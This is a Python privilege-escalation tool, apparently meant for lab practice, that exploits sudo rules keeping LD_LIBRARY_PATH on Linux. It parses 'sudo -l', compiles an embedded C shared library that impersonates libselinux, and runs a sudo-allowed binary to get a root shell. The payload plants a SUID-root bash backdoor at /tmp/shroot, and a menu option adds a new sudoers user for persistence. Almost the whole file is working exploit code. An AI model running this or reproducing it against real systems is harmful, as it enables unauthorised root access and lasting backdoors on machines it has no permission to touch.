#!/usr/bin/env python3
"""
LD_LIBRARY_PATH sudo helper — lab aid.

Stdlib only: os, sys, re, subprocess

    python3 ld_library_path_check.py

Payload drops /tmp/shroot (SUID root bash copy) then tries an interactive shell.
SUID on a .sh script does NOT work on Linux — this is a root-owned binary.
After a crash, run:  /tmp/shroot -p
"""

import os
import re
import subprocess
import sys

WORKDIR = "/tmp/ldlp_lab"
PAYLOAD_C = WORKDIR + "/hijack.c"
DEFAULT_LIBDIR = "/tmp"
SHROOT = "/tmp/shroot"

# Prefer these first — fewer reverse deps than libc / pcre2
PREFER_LIBS = (
    "libselinux.so.1",
    "libpcre2-8.so.0",
)

SKIP_LIBS = (
    "linux-vdso.so",
    "linux-gate.so",
    "ld-linux",
    "libc.so",
)

HIJACK_C = r"""
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

static void boom(void) __attribute__((constructor));
void boom(void) {
    unsetenv("LD_LIBRARY_PATH");
    setuid(0);
    setgid(0);
    FILE *f = fopen("/tmp/pwn.c", "w");
    if (f) {
        fputs("#include <unistd.h>\nint main(){setuid(0);setgid(0);execl(\"/bin/bash\",\"bash\",\"-p\",0);}\n", f);
        fclose(f);
    }
    system("gcc -o /tmp/shroot /tmp/pwn.c >/dev/null 2>&1");
    system("chown root:root /tmp/shroot >/dev/null 2>&1");
    system("chmod 4755 /tmp/shroot >/dev/null 2>&1");
    system("/tmp/shroot -p");
}

int getcon(char **con) { if (con) *con = NULL; return -1; }
int getcon_raw(char **con) { if (con) *con = NULL; return -1; }
int getpidcon(int pid, char **con) { if (con) *con = NULL; return -1; }
int getprevcon(char **con) { if (con) *con = NULL; return -1; }
int getfilecon(const char *p, char **con) { if (con) *con = NULL; return -1; }
int lgetfilecon(const char *p, char **con) { if (con) *con = NULL; return -1; }
int fgetfilecon(int fd, char **con) { if (con) *con = NULL; return -1; }
int setcon(const char *c) { return -1; }
int setfilecon(const char *p, const char *c) { return -1; }
int lsetfilecon(const char *p, const char *c) { return -1; }
int fsetfilecon(int fd, const char *c) { return -1; }
int setfscreatecon(const char *c) { return 0; }
int is_selinux_enabled(void) { return 0; }
int is_selinux_mls_enabled(void) { return 0; }
int security_getenforce(void) { return 0; }
void freecon(char *c) { (void)c; }
void freeconary(char **c) { (void)c; }
"""


def run(cmd, input_text=None):
    return subprocess.run(
        cmd,
        input=input_text,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
    )


def which(name):
    paths = os.environ.get("PATH", "/usr/bin:/bin").split(":")
    for d in paths:
        p = os.path.join(d, name)
        if os.path.isfile(p) and os.access(p, os.X_OK):
            return p
    return None


def banner(title):
    print("\n" + "=" * 60)
    print(title)
    print("=" * 60)


def parse_sudo_l(text):
    info = {
        "raw": text,
        "env_keep_ld_library": False,
        "env_keep_ld_preload": False,
        "setenv": False,
        "env_reset": False,
        "all_nopasswd": False,
        "all_cmds": False,
        "binaries": [],
    }
    lower = text.lower()
    if "env_keep+=ld_library_path" in lower:
        info["env_keep_ld_library"] = True
    if "env_keep+=ld_preload" in lower:
        info["env_keep_ld_preload"] = True
    if "env_reset" in lower:
        info["env_reset"] = True
    if re.search(r"\bSETENV\b", text):
        info["setenv"] = True
    if re.search(r"\([^)]*\)\s+NOPASSWD:\s*ALL\b", text):
        info["all_nopasswd"] = True
    if re.search(r"\([^)]*\)\s+ALL\b", text) and re.search(r":\s*ALL\b", text):
        info["all_cmds"] = True

    for m in re.finditer(r"NOPASSWD:\s*(.+)", text):
        chunk = m.group(1).strip()
        if chunk == "ALL":
            continue
        for part in chunk.split(","):
            part = re.sub(r"^\([^)]*\)\s*", "", part.strip())
            if part.startswith("/") and " " not in part:
                info["binaries"].append(part)

    for m in re.finditer(r"\([^)]+\)\s+(/[^\s,]+)", text):
        p = m.group(1)
        if p not in info["binaries"] and p != "ALL":
            info["binaries"].append(p)

    seen = []
    for b in info["binaries"]:
        if b not in seen:
            seen.append(b)
    info["binaries"] = seen
    return info


def sudo_l():
    r = run(["sudo", "-l"])
    if r.returncode != 0:
        print("[!] sudo -l failed.")
        print((r.stderr or r.stdout).strip())
        return None
    return r.stdout


def ldd_libs(binary):
    r = run(["ldd", binary])
    if r.returncode != 0:
        return [], (r.stderr or "ldd failed").strip()
    libs = []
    for line in r.stdout.splitlines():
        line = line.strip()
        if " => " in line:
            name = line.split(" => ")[0].strip()
        else:
            name = line.split()[0] if line else ""
        if name:
            libs.append(name)
    return libs, r.stdout


def is_skipped(name):
    for s in SKIP_LIBS:
        if s in name:
            return True
    return False


def env_ok(info):
    return info["env_keep_ld_library"] or info["setenv"]


def write_payload():
    try:
        os.makedirs(WORKDIR)
    except OSError:
        if not os.path.isdir(WORKDIR):
            print("[!] cannot create %s" % WORKDIR)
            return False
    try:
        f = open(PAYLOAD_C, "w")
        f.write(HIJACK_C)
        f.close()
    except OSError as e:
        print("[!] cannot write payload: %s" % e)
        return False
    if not which("gcc"):
        print("[!] gcc not in PATH")
        return False
    return True


def compile_so(soname, outdir):
    if not write_payload():
        return None
    out = os.path.join(outdir, soname)
    r = run(["gcc", "-shared", "-fPIC", "-o", out, PAYLOAD_C])
    if r.returncode != 0 or not os.path.isfile(out):
        print("[!] compile failed:")
        print(r.stderr or r.stdout)
        return None
    print("[+] wrote %s (%d bytes)" % (out, os.path.getsize(out)))
    return out


def prove_search(binary, soname, libdir):
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = libdir
    r = subprocess.run(
        ["ldd", binary],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True,
        env=env,
    )
    print(r.stdout)
    if libdir in r.stdout and soname in r.stdout:
        print("[+] linker resolves %s under %s" % (soname, libdir))
        return True
    print("[!] ldd did not bind %s to %s" % (soname, libdir))
    return False


def print_shroot_hint():
    print("")
    print("If id crashes (undefined symbol), check persist:")
    print("  ls -l %s" % SHROOT)
    print("  %s -p" % SHROOT)
    print("Need: -rwsr-xr-x 1 root root  ... and then id shows uid=0")


def run_hijack(binary, libdir):
    print("[*] sudo LD_LIBRARY_PATH=%s %s" % (libdir, binary))
    print_shroot_hint()
    os.execvp("sudo", ["sudo", "LD_LIBRARY_PATH=%s" % libdir, binary])


def add_sudo_user():
    if os.geteuid() != 0:
        print("[!] not root. Get the shell first (option 2 or %s -p)." % SHROOT)
        return
    name = input("new username [labadmin]: ").strip() or "labadmin"
    pw = input("password [labadmin]: ").strip() or "labadmin"
    if run(["id", name]).returncode != 0:
        run(["useradd", "-m", "-s", "/bin/bash", name])
    run(["chpasswd"], input_text="%s:%s" % (name, pw))
    snip = "/etc/sudoers.d/99-%s" % name
    try:
        f = open(snip, "w")
        f.write("%s ALL=(ALL:ALL) ALL\n" % name)
        f.close()
        os.chmod(snip, 0o440)
    except OSError as e:
        print("[!] cannot write %s: %s" % (snip, e))
        return
    chk = run(["visudo", "-cf", snip])
    if chk.returncode != 0:
        print("[!] visudo -c failed")
        print(chk.stderr)
        try:
            os.remove(snip)
        except OSError:
            pass
        return
    print("[+] %s can sudo ALL. Test: su - %s && sudo -l" % (name, name))


def print_verdict(info):
    banner("sudo -l parse")
    print(info["raw"].rstrip())
    print("")
    print("  env_keep+=LD_LIBRARY_PATH : %s" % info["env_keep_ld_library"])
    print("  env_keep+=LD_PRELOAD      : %s" % info["env_keep_ld_preload"])
    print("  SETENV                    : %s" % info["setenv"])
    print("  env_reset seen            : %s" % info["env_reset"])
    print("  (ALL) NOPASSWD: ALL       : %s" % info["all_nopasswd"])
    print("  binaries                  : %s" % (info["binaries"] or "(none parsed)"))

    if info["all_nopasswd"] or info["all_cmds"]:
        print("\n[!] Unrestricted sudo. Use: sudo -i")
        return "unrestricted"
    if not env_ok(info):
        print("\n[-] DEAD for LD_LIBRARY_PATH (need env_keep or SETENV).")
        if info["env_keep_ld_preload"]:
            print("    LD_PRELOAD is kept — different technique.")
        if info["binaries"]:
            print("    Limited sudo still present. GTFOBins:")
            for b in info["binaries"]:
                print("      %s" % b)
        return "dead"
    if not info["binaries"]:
        print("\n[-] env keep set but no binary path parsed. Read sudo -l.")
        return "partial"
    print("\n[+] ALIVE: limited sudo + LD_LIBRARY_PATH kept.")
    return "alive"


def choose_binary(info):
    existing = [b for b in info["binaries"] if os.path.isfile(b)]
    missing = [b for b in info["binaries"] if not os.path.isfile(b)]
    if missing:
        print("[!] not on disk: %s" % ", ".join(missing))
    if not existing:
        print("[!] no sudo binaries to ldd")
        return None
    print("\nSudo binaries:")
    i = 1
    for b in existing:
        print("  %d) %s" % (i, b))
        i += 1
    raw = input("choose [1]: ").strip() or "1"
    try:
        return existing[int(raw) - 1]
    except (ValueError, IndexError):
        print("[!] bad choice")
        return None


def rank_libs(names):
    """selinux first, then pcre2, then the rest. Skip libc/loader."""
    prefer = []
    rest = []
    seen = []
    for n in names:
        if "so" not in n or is_skipped(n) or n in seen:
            continue
        seen.append(n)
        if n in PREFER_LIBS:
            prefer.append(n)
        else:
            rest.append(n)
    ordered = []
    for p in PREFER_LIBS:
        if p in prefer:
            ordered.append(p)
    for n in rest:
        ordered.append(n)
    return ordered


def choose_lib(binary):
    libs, raw = ldd_libs(binary)
    if not libs:
        print("[!] ldd failed: %s" % raw)
        return None
    banner("ldd %s" % binary)
    print(raw)
    for n in libs:
        if is_skipped(n):
            print("  skip  %s" % n)
    shown = rank_libs(libs)
    print("Candidate SONAMEs (libc / loader skipped; selinux preferred):")
    i = 1
    for n in shown:
        mark = "  <- use this" if i == 1 else ""
        print("  [%d] %s%s" % (i, n, mark))
        i += 1
    if not shown:
        print("[!] nothing safe to impersonate")
        return None
    raw = input("choose SONAME [1]: ").strip() or "1"
    if raw.isdigit() and 1 <= int(raw) <= len(shown):
        return shown[int(raw) - 1]
    if raw in shown:
        return raw
    print("[!] bad choice")
    return None


def prepare(binary, soname, libdir):
    if not os.path.isdir(libdir):
        try:
            os.makedirs(libdir)
        except OSError as e:
            print("[!] %s" % e)
            return False
    if not os.access(libdir, os.W_OK):
        print("[!] cannot write %s" % libdir)
        return False
    so = compile_so(soname, libdir)
    if not so:
        return False
    prove_search(binary, soname, libdir)
    print("\nPrepared. Run:\n")
    print("  sudo LD_LIBRARY_PATH=%s %s" % (libdir, binary))
    print_shroot_hint()
    return True


def menu():
    print("""
What next?
  1) Prepare only (compile .so, print the sudo command)
  2) Drop into elevated shell (also plants /tmp/shroot)
  3) Create a new sudo user (must already be root)
  q) Quit
""")
    return input("choice: ").strip().lower()


def main():
    banner("LD_LIBRARY_PATH check")
    user = os.environ.get("USER") or os.environ.get("LOGNAME") or "?"
    print("user=%s uid=%d euid=%d cwd=%s" % (user, os.getuid(), os.geteuid(), os.getcwd()))

    if os.geteuid() == 0:
        print("[*] already root.")
        if input("create a sudo user anyway? [y/N]: ").strip().lower() == "y":
            add_sudo_user()
        return 0

    text = sudo_l()
    if text is None:
        return 1
    info = parse_sudo_l(text)
    verdict = print_verdict(info)

    if verdict == "unrestricted":
        c = input("run sudo -i now? [Y/n]: ").strip().lower() or "y"
        if c == "y":
            os.execvp("sudo", ["sudo", "-i"])
        return 0
    if verdict == "dead":
        return 2

    binary = choose_binary(info)
    if not binary:
        return 1
    soname = choose_lib(binary)
    if not soname:
        return 1

    libdir = DEFAULT_LIBDIR
    print("\n[*] payload dir: %s (writable=%s)" % (libdir, os.access(libdir, os.W_OK)))
    print("[*] default SONAME pick should be libselinux.so.1 if present")

    while True:
        choice = menu()
        if choice in ("q", "quit"):
            return 0
        if choice == "1":
            prepare(binary, soname, libdir)
        elif choice == "2":
            if not prepare(binary, soname, libdir):
                return 1
            run_hijack(binary, libdir)
        elif choice == "3":
            add_sudo_user()
        else:
            print("pick 1, 2, 3 or q")


if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        print("\n[*] aborted")
        sys.exit(130)
